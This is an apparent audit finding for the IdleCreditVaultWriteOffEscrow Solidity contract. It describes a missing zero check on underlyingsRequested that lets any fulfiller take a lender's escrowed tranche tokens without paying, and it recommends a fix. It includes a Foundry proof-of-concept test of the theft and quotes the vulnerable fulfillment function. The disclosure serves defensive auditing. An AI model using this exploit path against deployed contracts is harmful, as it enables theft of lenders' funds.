### Title
Zero-priced write-off request lets a fulfiller seize escrowed tranche tokens for free - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
The external bug is a "zero-amount passes validation" flaw: a 0 ETH deposit satisfied `depositAmount % roundValuePerEntry == 0` and `expectedValue == msg.value`, so a phantom entry was recorded without funds. The strongest analog in idle-tranches is `IdleCreditVaultWriteOffEscrow.createWriteOffRequest`, which reverts on `amount == 0` (tranches) but performs no check on `underlyingsRequested`. A lender can therefore register a write-off request that asks for 0 underlyings while depositing real tranche tokens. `fullfillWriteOffRequest` only enforces `_underlyings >= currentRequest.underlyings`, so any unprivileged fulfiller can call it with `_underlyings == 0`, pay nothing (and zero exit fee since `_totFee = 0 * fee / FULL_VALUE`), and receive the full escrowed tranche balance. [1](#0-0) [2](#0-1) 

### Finding Description
`createWriteOffRequest` validates `amount == 0` (tranches) but not `underlyingsRequested`:

```solidity
if (amount == 0) revert NotAllowed();
// no check on underlyingsRequested
IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
userRequests[msg.sender] = WriteOffRequest({
  tranches: currentRequest.tranches + amount,
  underlyings: currentRequest.underlyings + underlyingsRequested
});
```

The fulfillment check is `_underlyings < currentRequest.underlyings` → revert. When `underlyings == 0`, `0 < 0` is false, so a fulfiller passing `_tranches == currentRequest.tranches` and `_underlyings == 0` succeeds: `safeTransferFrom` moves 0 underlyings in, `_totFee == 0`, `safeTransfer(_user, 0)` pays the lender nothing, and `IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches)` hands all escrowed tranche tokens to the fulfiller. [3](#0-2) 

This mirrors the LooksRare issue: a zero value silently satisfies every comparison/arithmetic guard (`0 % x == 0` there; `0 >= 0` here), so a zero-value leg of an exchange executes without transferring value.

### Impact Explanation
Direct theft: the lender's escrowed tranche tokens (claim on the credit vault NAV) are transferred to the fulfiller while the lender receives 0 underlyings and the escrow collects 0 fees. Loss equals the full tranche balance escrowed in the zero-priced request; an attacker holding those tranches can redeem/withdraw against the vault normally. The fulfiller is an explicitly unprivileged actor (any wallet may fulfill), so no privileged trust assumption is violated. [4](#0-3) 

### Likelihood Explanation
The vulnerability triggers only while an epoch is running (`isEpochRunning()` gate) and only once a write-off request with `underlyingsRequested == 0` exists. This can arise from lender input error, an integrations/UI bug, or a lender naively calling `createWriteOffRequest(amount, 0)` intending to set the price later (the struct is additive, so a front-running fulfiller can strike before any correction). Once such a request exists, extraction is permissionless, atomic, and costs only gas. Because it depends on a victim-side misconfiguration rather than being exploitable at will, likelihood is moderate, but the loss per occurrence is total for that request.

### Recommendation
Add an explicit non-zero check in `createWriteOffRequest`:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

Optionally also defensively require `_underlyings > 0` inside `fullfillWriteOffRequest`, so legacy requests recorded with `underlyings == 0` cannot be fulfilled for free and must be deleted/recreated by the lender via `deleteWriteOffRequest`.

### Proof of Concept
Foundry fork test sketch (place in `test/foundry/`, using the existing `IdleCreditVault` test setup where `idleCDO`, `cdoEpoch`, `AAtranche`, underlying and a running epoch are available):

```solidity
function testZeroPricedWriteOffRequestSteal() external {
    // lender: KYC-passed AA holder
    uint256 amount = 10_000 * ONE_SCALE;
    _depositWithUser(lender, amount, true);           // lender mints AA tranches
    _startEpochAndCheckPrices(0);                      // epoch running (required by escrow)

    uint256 trancheBal = IERC20Detailed(AAtranche).balanceOf(lender);

    // lender creates a write-off request with a zero price (missing check)
    vm.startPrank(lender);
    IERC20Detailed(AAtranche).approve(address(escrow), trancheBal);
    escrow.createWriteOffRequest(trancheBal, 0);       // underlyingsRequested == 0: succeeds
    vm.stopPrank();

    // attacker: arbitrary unprivileged fulfiller, holds no underlying
    address attacker = makeAddr("attacker");
    uint256 balBefore = IERC20Detailed(AAtranche).balanceOf(attacker);

    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(lender, trancheBal, 0); // pays nothing

    // attacker received all escrowed tranches for free; lender received 0
    assertEq(IERC20Detailed(AAtranche).balanceOf(attacker) - balBefore, trancheBal);
    assertEq(IERC20Detailed(AAtranche).balanceOf(address(escrow)), 0);
    assertEq(underlying.balanceOf(lender), 0);
}
```

Note: verification was limited to indexed code. The core issue is fully confirmed by the escrow source (no `underlyingsRequested == 0` check; the `>=` fulfillment comparison admits 0), but the PoC harness details (`_depositWithUser`, `escrow` deployment wiring) would need matching to the repo's existing Foundry helpers.

  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);

    // If the fulfiller is the borrower, they can then choose to either keep the tranche tokens or write them off via
    // IdleCDOEpochVariant.writeOffDeposit method.
  }
